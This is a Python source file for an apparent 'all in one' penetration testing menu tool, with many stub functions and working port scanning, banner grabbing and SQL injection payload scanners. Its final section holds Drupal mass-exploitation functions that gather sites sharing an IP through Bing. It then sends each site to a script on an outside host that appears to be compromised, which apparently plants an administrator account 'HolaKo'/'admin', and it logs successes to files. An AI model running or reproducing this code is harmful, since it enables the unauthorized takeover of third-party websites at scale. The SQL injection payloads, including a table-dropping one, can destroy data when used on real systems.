#!/usr/bin/env python
#
#          All In One Tool For Penetration Testing 
#           Authors : dr. Muhammad Sobri Maulana, CEH
#           Contact: muhammadsobrimaulana31@gmail.com
#           GitHub: github.com/sobri3195
#
# -- coding: utf-8 --
# -*- coding: utf-8 -*-

import sys  # noqa
import os   # noqa
import time # noqa
import re   # noqa: Add missing re import
import socket # noqa
import json # noqa
import glob # noqa
import random
import threading
from getpass import getpass
from platform import system
from xml.dom import minidom
from optparse import OptionParser
from time import sleep

# Import from compatibility module
from pegasus_imports import httplib, urllib2, urlparse, queue, commands, input_func, telnetlib, requests

# Define raw_input for backward compatibility
raw_input = input_func

# Use the REQUESTS_AVAILABLE flag from pegasus_imports
REQUESTS_AVAILABLE = requests is not None

# Define missing variables
minu = {}
wpsymposium = []
wpsycmium = wpsymposium  # Alias for wpsycmium

# Define missing functions
def clearScr():
    """Clear the screen based on the operating system."""
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')

def TNscan():
    """Placeholder for TNscan function."""
    print("TNscan function is not implemented yet")

# New imports for enhanced features
try:
    import tkinter as tk
    from tkinter import ttk
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

# Define placeholder functions for undefined functions
def not_implemented_yet(*args, **kwargs):
    """Placeholder for functions that are not yet implemented."""
    print("This feature is not implemented yet. It will be available in future updates.")
    return None

# Import our new modules
try:
    from reverse_engineering import reverse_engineering_menu
    RE_MODULE_FOUND = True
except ImportError:
    RE_MODULE_FOUND = False

try:
    from cryptography import crypto_menu
    CRYPTO_MODULE_FOUND = True
except ImportError:
    CRYPTO_MODULE_FOUND = False

try:
    from osint import osint_menu
    OSINT_MODULE_FOUND = True
except ImportError:
    OSINT_MODULE_FOUND = False

# Define missing menu functions
def reverse_engineering_menu():
    """Reverse engineering tools"""
    if RE_MODULE_FOUND:
        # Use the imported module
        from reverse_engineering import reverse_engineering_menu as re_menu
        re_menu()
    else:
        not_implemented_yet()

def forensics_menu():
    """Digital forensics tools"""
    if os.path.exists("forensics.py"):
        try:
            from forensics import forensics_menu as forensics_menu_func
            forensics_menu_func()
        except ImportError:
            not_implemented_yet()
    else:
        not_implemented_yet()

def crypto_menu():
    """Cryptography tools"""
    if CRYPTO_MODULE_FOUND:
        # Use the imported module
        from cryptography import crypto_menu as crypto_menu_func
        crypto_menu_func()
    else:
        not_implemented_yet()

def mobile_menu():
    """Mobile security tools"""
    if os.path.exists("mobile_security.py"):
        try:
            from mobile_security import mobile_security_menu
            mobile_security_menu()
        except ImportError:
            not_implemented_yet()
    else:
        not_implemented_yet()

def cloud_menu():
    """Cloud security tools"""
    if os.path.exists("cloud_security.py"):
        try:
            from cloud_security import cloud_security_menu
            cloud_security_menu()
        except ImportError:
            not_implemented_yet()
    else:
        not_implemented_yet()

def iot_menu():
    """IoT security tools"""
    if os.path.exists("iot_security.py"):
        try:
            from iot_security import iot_security_menu
            iot_security_menu()
        except ImportError:
            not_implemented_yet()
    else:
        not_implemented_yet()

def ics_menu():
    """ICS/SCADA security tools"""
    if os.path.exists("ics_security.py"):
        try:
            from ics_security import ics_security_menu
            ics_security_menu()
        except ImportError:
            not_implemented_yet()
    else:
        not_implemented_yet()

def malware_menu():
    """Malware analysis tools"""
    if os.path.exists("malware_analysis.py"):
        try:
            from malware_analysis import malware_analysis_menu
            malware_analysis_menu()
        except ImportError:
            not_implemented_yet()
    else:
        not_implemented_yet()

def osint_menu():
    """OSINT tools"""
    if OSINT_MODULE_FOUND:
        # Use the imported module
        from osint import osint_menu as osint_menu_func
        osint_menu_func()
    else:
        not_implemented_yet()

def privacy_menu():
    """Privacy tools"""
    if os.path.exists("privacy_tools.py"):
        try:
            from privacy_tools import privacy_tools_menu
            privacy_tools_menu()
        except ImportError:
            not_implemented_yet()
    else:
        not_implemented_yet()

def reporting_menu():
    """Reporting tools"""
    if os.path.exists("reporting_tools.py"):
        try:
            from reporting_tools import reporting_tools_menu
            reporting_tools_menu()
        except ImportError:
            not_implemented_yet()
    else:
        not_implemented_yet()

def settings_menu():
    not_implemented_yet()

# Placeholder for reconnaissance functions
def network_discovery():
    clearScr()
    print("""
    ###########################################
    #         Network Discovery Tools         #
    ###########################################
    
    1. Ping Sweep
    2. Host Discovery
    3. DNS Lookup
    4. WHOIS Information
    5. Back to Main Menu
    """)
    
    choice = input("Select an option: ")
    
    try:
        choice = int(choice)
        if choice == 1:
            ping_sweep()
        elif choice == 2:
            host_discovery()
        elif choice == 3:
            dns_lookup()
        elif choice == 4:
            whois_info()
        elif choice == 5:
            main_menu()
        else:
            print("Invalid option. Please try again.")
            network_discovery()
    except ValueError:
        print("Please enter a number.")
        network_discovery()

def ping_sweep():
    clearScr()
    print("[+] Ping Sweep Tool")
    target = input("Enter target IP or network (e.g., 192.168.1.0/24): ")
    
    # Extract base IP for single host scan
    ip_parts = target.split('/')
    base_ip = ip_parts[0]
    
    if len(ip_parts) > 1:
        # Network scan
        try:
            mask = int(ip_parts[1])
            if mask < 24 or mask > 32:
                print("[!] For safety, only /24 to /32 networks are supported")
                mask = 24
                
            # Calculate IP range
            base_octets = base_ip.split('.')
            base = '.'.join(base_octets[0:3]) + '.'
            start = 1
            end = 254
            
            if mask > 24:
                # Calculate smaller range for /25 and higher
                start = int(base_octets[3])
                end = start + (2**(32-mask)) - 1
                if end > 254:
                    end = 254
            
            print(f"[*] Scanning range {base}{start} to {base}{end}")
            active_hosts = 0
            
            for i in range(start, end + 1):
                ip = f"{base}{i}"
                response = os.system(f"ping -n 1 -w 200 {ip} > nul")
                if response == 0:
                    print(f"[+] Host {ip} is active")
                    active_hosts += 1
                    
            print(f"[*] Scan complete. Found {active_hosts} active hosts.")
                
        except Exception as e:
            print(f"[!] Error: {e}")
    else:
        # Single host ping
        print(f"[*] Pinging {base_ip}...")
        response = os.system(f"ping -n 4 {base_ip}")
        if response == 0:
            print(f"[+] Host {base_ip} is active")
        else:
            print(f"[-] No response from {base_ip}")
    
    input("\nPress Enter to continue...")
    network_discovery()

def host_discovery():
    clearScr()
    print("[+] Host Discovery Tool")
    target = input("Enter target hostname or IP: ")
    
    try:
        ip = socket.gethostbyname(target)
        hostname = socket.getfqdn(ip)
        
        print(f"\n[+] Results for {target}:")
        print(f"[+] IP Address: {ip}")
        print(f"[+] Hostname: {hostname}")
        
        print("\n[*] Checking open ports...")
        common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080]
        open_ports = []
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                service = socket.getservbyport(port)
                open_ports.append((port, service))
            sock.close()
        
        if open_ports:
            print("\n[+] Open ports:")
            for port, service in open_ports:
                print(f"[+] Port {port} ({service}) is open")
        else:
            print("\n[-] No common ports found open")
        
    except Exception as e:
        print(f"[!] Error: {e}")
    
    input("\nPress Enter to continue...")
    network_discovery()

def dns_lookup():
    clearScr()
    print("[+] DNS Lookup Tool")
    target = input("Enter domain name: ")
    
    try:
        # Get IP address
        ip = socket.gethostbyname(target)
        print(f"\n[+] IP address for {target}: {ip}")
        
        # Try to get mail servers
        if REQUESTS_AVAILABLE:
            print("\n[*] Fetching DNS records...")
            
            # Use nslookup command for MX records
            print("\n[+] Mail (MX) records:")
            os.system(f"nslookup -type=mx {target}")
            
            # Use nslookup for NS records
            print("\n[+] Name Server (NS) records:")
            os.system(f"nslookup -type=ns {target}")
            
        else:
            print("[!] Advanced DNS lookups require the requests library")
    
    except Exception as e:
        print(f"[!] Error: {e}")
    
    input("\nPress Enter to continue...")
    network_discovery()

def whois_info():
    clearScr()
    print("[+] WHOIS Information Tool")
    target = input("Enter domain name: ")
    
    try:
        # Try to use whois command if available
        print(f"\n[*] Looking up WHOIS information for {target}...")
        os.system(f"whois {target}")
    except Exception as e:
        print(f"[!] Error: {e}")
        print("[!] WHOIS command not available. Please install whois package.")
    
    input("\nPress Enter to continue...")
    network_discovery()

def port_scanning_menu():
    not_implemented_yet()
    
def service_enumeration():
    not_implemented_yet()
    
def os_fingerprinting():
    not_implemented_yet()
    
def dns_recon():
    not_implemented_yet()
    
def email_harvesting():
    not_implemented_yet()
    
def website_recon():
    not_implemented_yet()
    
def metadata_extraction():
    not_implemented_yet()
    
def shodan_search():
    not_implemented_yet()
    
def ssl_analysis():
    not_implemented_yet()
    
def cloud_discovery():
    not_implemented_yet()
    
def api_discovery():
    not_implemented_yet()
    
def subdomain_enum():
    not_implemented_yet()
    
def tech_identification():
    not_implemented_yet()

# Define vulnerability scan functions
def auto_vuln_scan():
    not_implemented_yet()
    
def network_vuln_scan():
    not_implemented_yet()

def web_vuln_scan():
    not_implemented_yet()

def cms_vuln_scan():
    not_implemented_yet()

def database_vuln_scan():
    not_implemented_yet()

def iot_vuln_scan():
    not_implemented_yet()

def cloud_vuln_scan():
    not_implemented_yet()

def mobile_vuln_scan():
    not_implemented_yet()

def api_vuln_scan():
    not_implemented_yet()

def compliance_testing():
    not_implemented_yet()

def owasp_top10_scan():
    not_implemented_yet()

def container_security():
    not_implemented_yet()

def firewall_testing():
    not_implemented_yet()

def ids_ips_testing():
    not_implemented_yet()

def ssl_tls_vuln_scan():
    not_implemented_yet()

# Web application security functions
def sql_injection_testing():
    clearScr()
    print("""
    ###########################################
    #         Web Security Tools              #
    ###########################################
    
    1. SQL Injection Scanner
    2. XSS Vulnerability Scanner
    3. Directory Scanner
    4. CMS Detector
    5. Back to Main Menu
    """)
    
    choice = input("Select an option: ")
    
    try:
        # Import our web security tools module
        from web_security import run_web_security_tools
        tools = run_web_security_tools()
        
        choice = int(choice)
        if choice == 1:
            tools.sqli_scanner()
        elif choice == 2:
            tools.xss_scanner()
        elif choice == 3:
            tools.directory_scan()
        elif choice == 4:
            tools.cms_detector()
        elif choice == 5:
            main_menu()
        else:
            print("Invalid option. Please try again.")
            sql_injection_testing()
    except ImportError:
        print("[!] Web security tools module not found.")
        print("[*] Using built-in implementation.")
        # Fall back to existing implementation
        basic_sqli_scanner()
    except ValueError:
        print("Please enter a number.")
        sql_injection_testing()
    
    input("\nPress Enter to continue...")
    main_menu()

def basic_sqli_scanner():
    clearScr()
    print("[+] Basic SQL Injection Scanner")
    target = input("Enter target URL (e.g., http://example.com/page.php?id=1): ")
    
    if not (target.startswith('http://') or target.startswith('https://')):
        target = 'http://' + target
    
    # Basic SQL injection payloads
    payloads = [
        "'", 
        "\"", 
        "1' OR '1'='1", 
        "1\" OR \"1\"=\"1", 
        "' OR 1=1 --", 
        "\" OR 1=1 --", 
        "' OR '1'='1' --", 
        "1' OR '1'='1' --", 
        "admin' --",
        "1'; DROP TABLE users--",
        "1' UNION SELECT 1,2,3--"
    ]
    
    # Error strings that might indicate SQL injection vulnerability
    error_strings = [
        "SQL syntax",
        "MySQL Error",
        "ORA-",
        "Oracle Error",
        "Microsoft SQL Server",
        "ODBC Driver",
        "DB2 SQL Error",
        "SQLite Error",
        "PostgreSQL Error",
        "Unclosed quotation mark",
        "mysql_fetch_array()",
        "Warning: mysql_",
        "function.mysql",
        "MySQL Result"
    ]
    
    if not REQUESTS_AVAILABLE:
        print("[!] The requests library is required for this feature.")
        input("\nPress Enter to continue...")
        sql_injection_testing()
        return
    
    print(f"[*] Testing {target} for SQL injection vulnerabilities...")
    print("[*] This might take a moment...")
    
    # Parse the URL to extract parameters
    parsed_url = urlparse(target)
    params = {}
    
    if parsed_url.query:
        query_params = parsed_url.query.split('&')
        for param in query_params:
            if '=' in param:
                key, value = param.split('=', 1)
                params[key] = value
    
    if not params:
        print("[!] No parameters found in the URL.")
        print("[!] Try a URL with parameters like: http://example.com/page.php?id=1")
        input("\nPress Enter to continue...")
        sql_injection_testing()
        return
    
    print(f"[+] Found {len(params)} parameters: {', '.join(params.keys())}")
    
    vulnerable = False
    
    # Test each parameter with each payload
    for param in params:
        print(f"[*] Testing parameter: {param}")
        
        for payload in payloads:
            # Create a copy of the parameters
            test_params = params.copy()
            # Modify the current parameter with the payload
            test_params[param] = payload
            
            # Reconstruct query string
            query_string = '&'.join([f"{k}={v}" for k, v in test_params.items()])
            
            # Reconstruct the URL
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
            
            try:
                response = requests.get(test_url, timeout=5)
                
                # Check for error messages that might indicate SQL injection
                for error in error_strings:
                    if error in response.text:
                        print(f"[+] Possible SQL injection vulnerability found!")
                        print(f"[+] Parameter: {param}")
                        print(f"[+] Payload: {payload}")
                        print(f"[+] Error detected: {error}")
                        vulnerable = True
                        break
                
                # Check for other indicators
                if len(response.text) > 10000:  # Unusually large response
                    print(f"[+] Possible SQL injection vulnerability found!")
                    print(f"[+] Parameter: {param}")
                    print(f"[+] Payload: {payload}")
                    print(f"[+] Unusual response size: {len(response.text)} bytes")
                    vulnerable = True
                
            except Exception as e:
                print(f"[!] Error testing {test_url}: {e}")
    
    if not vulnerable:
        print("[*] No obvious SQL injection vulnerabilities detected.")
        print("[*] This doesn't guarantee the site is secure. Consider manual testing.")
    
    input("\nPress Enter to continue...")
    sql_injection_testing()

def url_parameter_tester():
    clearScr()
    print("[+] URL Parameter SQL Injection Tester")
    print("[*] This tool helps you test specific URL parameters for SQL injection.")
    
    target = input("Enter target URL base (e.g., http://example.com/page.php): ")
    param = input("Enter parameter name to test (e.g., id): ")
    value = input("Enter parameter value (e.g., 1): ")
    
    if not (target.startswith('http://') or target.startswith('https://')):
        target = 'http://' + target
    
    # Construct test URL
    test_url = f"{target}?{param}={value}"
    print(f"[*] Base URL for testing: {test_url}")
    
    # SQL injection test payloads
    payloads = {
        "Boolean-based": [
            f"{value} AND 1=1",
            f"{value} AND 1=2",
            f"{value} OR 1=1"
        ],
        "Union-based": [
            f"{value} UNION SELECT 1",
            f"{value} UNION SELECT 1,2",
            f"{value} UNION SELECT 1,2,3",
            f"{value} UNION ALL SELECT 1,2,3,4,5--"
        ],
        "Error-based": [
            f"{value}'",
            f"{value}\"",
            f"{value})(",
            f"{value}'"
        ],
        "Time-based": [
            f"{value} AND SLEEP(5)",
            f"{value} OR SLEEP(5)",
            f"{value}' AND SLEEP(5) AND '1'='1",
            f"{value}'; WAITFOR DELAY '0:0:5'--"
        ]
    }
    
    if not REQUESTS_AVAILABLE:
        print("[!] The requests library is required for this feature.")
        input("\nPress Enter to continue...")
        sql_injection_testing()
        return
    
    # Get baseline response
    try:
        print("[*] Getting baseline response...")
        baseline_start = time.time()
        baseline = requests.get(test_url, timeout=10)
        baseline_time = time.time() - baseline_start
        baseline_length = len(baseline.text)
        baseline_status = baseline.status_code
        
        print(f"[+] Baseline established: {baseline_status} status, {baseline_length} bytes, {baseline_time:.2f}s")
        
        # Test each payload category
        for category, category_payloads in payloads.items():
            print(f"\n[*] Testing {category} payloads...")
            
            for payload in category_payloads:
                payload_url = f"{target}?{param}={payload}"
                
                try:
                    start_time = time.time()
                    response = requests.get(payload_url, timeout=15)
                    elapsed = time.time() - start_time
                    
                    # Check for significant differences
                    length_diff = abs(len(response.text) - baseline_length)
                    time_diff = elapsed - baseline_time
                    status_diff = response.status_code != baseline_status
                    
                    if status_diff or length_diff > 50 or time_diff > 4:
                        print(f"[+] Potential vulnerability with payload: {payload}")
                        print(f"    Status: {response.status_code} (baseline: {baseline_status})")
                        print(f"    Length: {len(response.text)} bytes (diff: {length_diff})")
                        print(f"    Time: {elapsed:.2f}s (diff: {time_diff:.2f}s)")
                        
                except Exception as e:
                    print(f"[!] Error testing {payload}: {e}")
        
    except Exception as e:
        print(f"[!] Error establishing baseline: {e}")
    
    input("\nPress Enter to continue...")
    sql_injection_testing()

def form_injection_tester():
    clearScr()
    print("[+] Form Injection Tester")
    print("[!] This feature requires more complex implementation.")
    print("[!] For now, try these manual tests on web forms:")
    
    print("""
    1. Try entering ' or " in form fields to check for errors
    2. Test login forms with inputs like:
       - Username: admin' --
       - Password: anything
    3. Look for error messages that reveal database information
    4. Try boolean logic in numeric fields: 1 AND 1=1
    """)
    
    input("\nPress Enter to continue...")
    sql_injection_testing()

def xss_scanner():
    not_implemented_yet()

def csrf_tester():
    not_implemented_yet()

def file_inclusion_scanner():
    not_implemented_yet()

def command_injection_scanner():
    not_implemented_yet()

def directory_traversal_testing():
    not_implemented_yet()

def file_upload_vulnerability_scanner():
    not_implemented_yet()

def web_shell_detection():
    not_implemented_yet()

def waf_detection():
    not_implemented_yet()

def hidden_parameter_discovery():
    not_implemented_yet()

def api_security_testing():
    not_implemented_yet()

def jwt_token_analysis():
    not_implemented_yet()

def oauth_security_testing():
    not_implemented_yet()

def graphql_security_testing():
    not_implemented_yet()

def wordpress_scanner():
    not_implemented_yet()

def joomla_scanner():
    not_implemented_yet()

def drupal_scanner():
    not_implemented_yet()

def web_cache_vulnerability_scanner():
    not_implemented_yet()

def cors_misconfiguration_scanner():
    not_implemented_yet()

def http_header_security_analysis():
    not_implemented_yet()

# Define networks functions
def network_scanning():
    clearScr()
    print("""
    ###########################################
    #         Network Security Tools          #
    ###########################################
    
    1. Network Discovery Scanner
    2. Port Scanner
    3. Vulnerability Scanner
    4. Traceroute
    5. Back to Main Menu
    """)
    
    choice = input("Select an option: ")
    
    try:
        # Import our network tools module
        from network_tools import run_network_tools
        tools = run_network_tools()
        
        choice = int(choice)
        if choice == 1:
            tools.network_scanner()
        elif choice == 2:
            tools.port_scanner()
        elif choice == 3:
            tools.vulnerability_scanner()
        elif choice == 4:
            tools.traceroute()
        elif choice == 5:
            main_menu()
        else:
            print("Invalid option. Please try again.")
            network_scanning()
    except ImportError:
        print("[!] Network tools module not found.")
        print("[*] Using fallback implementation.")
        port_scanner()
    except ValueError:
        print("Please enter a number.")
        network_scanning()
    
    input("\nPress Enter to continue...")
    main_menu()

def port_scanner():
    clearScr()
    print("[+] Basic Port Scanner")
    target = input("Enter target IP or hostname: ")
    
    try:
        # Resolve hostname to IP
        target_ip = socket.gethostbyname(target)
        print(f"[*] Target IP: {target_ip}")
        
        # Default port range
        start_port = input("Enter start port [1]: ") or "1"
        end_port = input("Enter end port [1024]: ") or "1024"
        
        try:
            start_port = int(start_port)
            end_port = int(end_port)
            
            if start_port < 1 or end_port > 65535 or start_port > end_port:
                print("[!] Invalid port range. Using default 1-1024.")
                start_port = 1
                end_port = 1024
        except ValueError:
            print("[!] Invalid input. Using default port range 1-1024.")
            start_port = 1
            end_port = 1024
        
        print(f"[*] Scanning ports {start_port}-{end_port} on {target_ip}...")
        open_ports = []
        
        # Start the scan
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                    open_ports.append((port, service))
                    print(f"[+] Port {port} ({service}): Open")
                except:
                    open_ports.append((port, "unknown"))
                    print(f"[+] Port {port} (unknown service): Open")
            sock.close()
        
        # Scan complete
        print(f"\n[*] Scan complete. Found {len(open_ports)} open ports.")
        
    except socket.gaierror:
        print("[!] Hostname could not be resolved. Please check the target.")
    except socket.error:
        print("[!] Could not connect to server.")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    input("\nPress Enter to continue...")
    network_scanning()

def service_detector():
    clearScr()
    print("[+] Service Detector")
    print("[*] This tool identifies services running on open ports.")
    
    target = input("Enter target IP or hostname: ")
    
    try:
        # Resolve hostname to IP
        target_ip = socket.gethostbyname(target)
        print(f"[*] Target IP: {target_ip}")
        
        # Scan common service ports
        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
            445: "SMB",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            8080: "HTTP-Proxy"
        }
        
        print(f"[*] Scanning common service ports on {target_ip}...")
        open_services = []
        
        # Start the scan
        for port, service in common_ports.items():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_services.append((port, service))
                print(f"[+] Port {port} ({service}): Open")
                
                # Try to get banner for additional info
                if port in [21, 22, 25, 110, 143]:
                    try:
                        banner_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        banner_sock.settimeout(2)
                        banner_sock.connect((target_ip, port))
                        banner = banner_sock.recv(1024).decode('utf-8', errors='ignore').strip()
                        print(f"    Banner: {banner}")
                        banner_sock.close()
                    except:
                        pass
            sock.close()
        
        # Scan complete
        print(f"\n[*] Scan complete. Found {len(open_services)} open services.")
        
    except socket.gaierror:
        print("[!] Hostname could not be resolved. Please check the target.")
    except socket.error:
        print("[!] Could not connect to server.")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    input("\nPress Enter to continue...")
    network_scanning()

def packet_analysis():
    not_implemented_yet()

def traffic_monitoring():
    not_implemented_yet()

def arp_spoofing():
    not_implemented_yet()

def dns_spoofing():
    not_implemented_yet()

def mitm_attacks():
    not_implemented_yet()

def network_sniffing():
    not_implemented_yet()

def protocol_analysis():
    not_implemented_yet()

def ids_ips_evasion():
    not_implemented_yet()

def proxy_tools():
    not_implemented_yet()

def vpn_security_testing():
    not_implemented_yet()

def route_manipulation():
    not_implemented_yet()

def network_device_exploitation():
    not_implemented_yet()

def tcpip_fingerprinting():
    not_implemented_yet()

# Define wireless functions
def wifi_network_scanner():
    clearScr()
    print("""
    ###########################################
    #         Wireless Security Tools         #
    ###########################################
    
    1. WiFi Network Scanner
    2. WEP Cracking
    3. WPA Handshake Capture
    4. Bluetooth Scanner
    5. Back to Main Menu
    """)
    
    choice = input("Select an option: ")
    
    try:
        # Import our wireless tools module
        from wireless_tools import run_wireless_tools
        tools = run_wireless_tools()
        
        choice = int(choice)
        if choice == 1:
            tools.wifi_scanner()
        elif choice == 2:
            tools.wep_attack()
        elif choice == 3:
            tools.wpa_attack()
        elif choice == 4:
            tools.bluetooth_scanner()
        elif choice == 5:
            main_menu()
        else:
            print("Invalid option. Please try again.")
            wifi_network_scanner()
    except ImportError:
        print("[!] Wireless tools module not found.")
        print("[*] Using fallback implementation.")
        not_implemented_yet()
    except ValueError:
        print("Please enter a number.")
        wifi_network_scanner()
    
    input("\nPress Enter to continue...")
    main_menu()

def wep_cracking():
    not_implemented_yet()

def wpa_cracking():
    not_implemented_yet()

def wps_attacks():
    not_implemented_yet()

def evil_twin_attacks():
    not_implemented_yet()

def bluetooth_security():
    not_implemented_yet()

def wireless_traffic_analysis():
    not_implemented_yet()

def jamming_detection():
    not_implemented_yet()

def rogue_ap_detection():
    not_implemented_yet()

def wireless_ids_ips():
    not_implemented_yet()

def wifi_deauthentication():
    not_implemented_yet()

def rfid_nfc_security():
    not_implemented_yet()

def zigbee_security():
    not_implemented_yet()

def wifi_geolocation():
    not_implemented_yet()

def wireless_iot_security():
    not_implemented_yet()

# Define password functions
def dictionary_attack():
    clearScr()
    print("""
    ###########################################
    #         Dictionary Attack Tools         #
    ###########################################
    
    1. Hash Cracker
    2. Password Strength Analyzer
    3. Back to Main Menu
    """)
    
    choice = input("Select an option: ")
    
    try:
        # Import our dictionary attack module
        from dictionary_attack import run_dictionary_attack
        tools = run_dictionary_attack()
        
        choice = int(choice)
        if choice == 1:
            tools.hash_cracker()
        elif choice == 2:
            tools.password_strength_analyzer()
        elif choice == 3:
            main_menu()
        else:
            print("Invalid option. Please try again.")
            dictionary_attack()
    except ImportError:
        print("[!] Dictionary attack module not found.")
        print("[*] Using fallback implementation.")
        not_implemented_yet()
    except ValueError:
        print("Please enter a number.")
        dictionary_attack()
    
    input("\nPress Enter to continue...")
    main_menu()

def brute_force_attack():
    not_implemented_yet()

def rainbow_table_attack():
    not_implemented_yet()

def password_profiling():
    not_implemented_yet()

def custom_password_generator():
    not_implemented_yet()

def hash_cracking():
    not_implemented_yet()

def social_engineering_passwords():
    not_implemented_yet()

def default_password_check():
    not_implemented_yet()

def password_strength_analyzer():
    not_implemented_yet()

def password_recovery_tools():
    not_implemented_yet()

def service_specific_password_attacks():
    not_implemented_yet()

def credential_harvesting():
    not_implemented_yet()

def password_policy_tester():
    not_implemented_yet()

def pass_the_hash_attacks():
    not_implemented_yet()

def keylogger_tools():
    not_implemented_yet()

# Define exploitation functions
def remote_exploitation():
    not_implemented_yet()

def client_side_exploitation():
    not_implemented_yet()

def web_application_exploitation():
    not_implemented_yet()

def database_exploitation():
    not_implemented_yet()

def vulnerability_exploitation():
    not_implemented_yet()

def service_exploitation():
    not_implemented_yet()

def local_exploitation():
    not_implemented_yet()

def exploit_development():
    not_implemented_yet()

def shellcode_generation():
    not_implemented_yet()

def buffer_overflow_tools():
    not_implemented_yet()

def format_string_exploitation():
    not_implemented_yet()

def command_injection():
    not_implemented_yet()

def race_condition_exploitation():
    not_implemented_yet()

def fuzzing_tools():
    not_implemented_yet()

def payload_generation():
    not_implemented_yet()

# Define post exploitation functions
def privilege_escalation():
    not_implemented_yet()

def persistence_mechanisms():
    not_implemented_yet()

def lateral_movement():
    not_implemented_yet()

def data_exfiltration():
    not_implemented_yet()

def evidence_removal():
    not_implemented_yet()

def keylogging():
    not_implemented_yet()

def screenshot_capture():
    not_implemented_yet()

def remote_command_control():
    not_implemented_yet()

def backdoor_deployment():
    not_implemented_yet()

def process_manipulation():
    not_implemented_yet()

def memory_forensics_evasion():
    not_implemented_yet()

def antivirus_evasion():
    not_implemented_yet()

def firewall_ids_evasion():
    not_implemented_yet()

def pivoting_techniques():
    not_implemented_yet()

def post_credential_harvesting():
    not_implemented_yet()

# Define social engineering functions
def phishing_campaigns():
    not_implemented_yet()

def spear_phishing():
    not_implemented_yet()

def smishing():
    not_implemented_yet()

def vishing():
    not_implemented_yet()

def qr_code_phishing():
    not_implemented_yet()

def social_media_attacks():
    not_implemented_yet()

def physical_social_engineering():
    not_implemented_yet()

def pretexting_templates():
    not_implemented_yet()

def watering_hole_attacks():
    not_implemented_yet()

def malicious_document_creation():
    not_implemented_yet()

def social_engineering_toolkit():
    not_implemented_yet()

def fake_website_generation():
    not_implemented_yet()

def credential_harvesting_social():
    not_implemented_yet()

def business_email_compromise():
    not_implemented_yet()

def social_engineering_analytics():
    not_implemented_yet()

# Fix undefined variables
def fb():
    not_implemented_yet()

def about():
    not_implemented_yet()

# Fix the wpsycmium undefined
wpsymposium = []

# Fix undefined user and pwd variables
user = "HolaKo"
pwd = "admin"

# Fix cinurl undefined
cinurl = None

########################## 
# Rest of the code remains unchanged


            #Definition Of Drupal Bing Expoliter 
def drupal():

    '''Drupal Exploit Binger All Websites Of server '''
    ip  = raw_input('1- IP : ')
    page  = 1
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"&go=Valider&qs=n&form=QBRE&pq=ip%3A"+ip+"&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      
      for url in findurl :
        try : 
            
                        urlpa = urlparse(url)
                        site  = urlpa.netloc

                        print("[+] Testing At "+site)
                        resp = urllib2.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url='+site+'&submit=submit')
                        read=resp.read()
                        if "User : HolaKo" in read:
                           print("Exploit Dapat =>"+site)

                           print("user:HolaKo\npass:admin")
                           a = open('up.txt','a')
                           a.write(site+'\n')
                           a.write("user:"+user+"\npass:"+pwd+"\n")
                        else:
                           print("[-] Expl Not Dapat :( ")

        except Exception as ex:
                       print(ex)
                       sys.exit(0)


            #Drupal Server ExtraCtor
def getdrupal():
    ip  = raw_input('Enter The Ip : ')
    page  = 1
    sites = list()
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"+node&go=Valider&qs=ds&form=QBRE&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      
      for url in findurl :
                             split = urlparse(url)
                             site   = split.netloc
                             if site not in sites :
                                      print(site)
                                      sites.append(site)
      

            #Drupal Mass List Exploiter 
def drupallist():
    listop = raw_input("Enter The list Txt :")
    fileopen = open(listop,'r')
    content = fileopen.readlines() 
    for i in content :
        url=i.strip()
        try :
            openurl = urllib2.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url='+url+'&submit=submit')
            readcontent = openurl.read()
            if  "Success" in readcontent :
                print("[+]Success =>"+url)
                print("[-]username:HolaKo\n[-]password:admin")
                save = open('drupal.txt','a')
                save.write(url+"\n"+"[-]username:HolaKo\n[-]password:admin\n")
                               
            else : 
                print(i + "=> exploit not Dapat ")
        except Exception as ex:
            print(ex)
def maine():
    
     print(minu)
     choose = raw_input("choose a number :")
     while True : 
      
      if choose == "1": 
        drupal()
      if choose == "2":
        getdrupal()
      if choose == "3":
        drupallist()
      if choose == "4":
        about()
      if choose == "99":
           
            menu()
      con = raw_input('Lanjut [Y/n] -> ')
      if con[0].upper() == 'N' :
                                    exit()
      if con[0].upper() == 'Y' :
                                    maine()
def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]
def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
